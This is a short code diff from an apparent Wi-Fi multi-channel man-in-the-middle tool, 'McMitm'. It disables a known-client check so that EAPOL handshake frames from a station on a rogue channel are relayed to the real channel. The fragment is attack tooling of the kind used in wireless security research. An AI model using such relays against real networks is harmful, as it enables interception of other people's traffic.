@@ -106,7 +106,7 @@ void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const vector<uint8
 
     // EAPOL od AP → forward na rogue channel
     if(addr2 == client_mac){
-        if(is_eapol(*pdu) && clients.contains(addr2)){
+        if(is_eapol(*pdu) /*&& clients.contains(addr2)*/){
             int eapol_msg = get_eapol_msg_num(*pdu);
             log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA ->  real channel", eapol_msg);
             if(eapol_msg == 2 || eapol_msg == 4) send_to_real(*pdu);
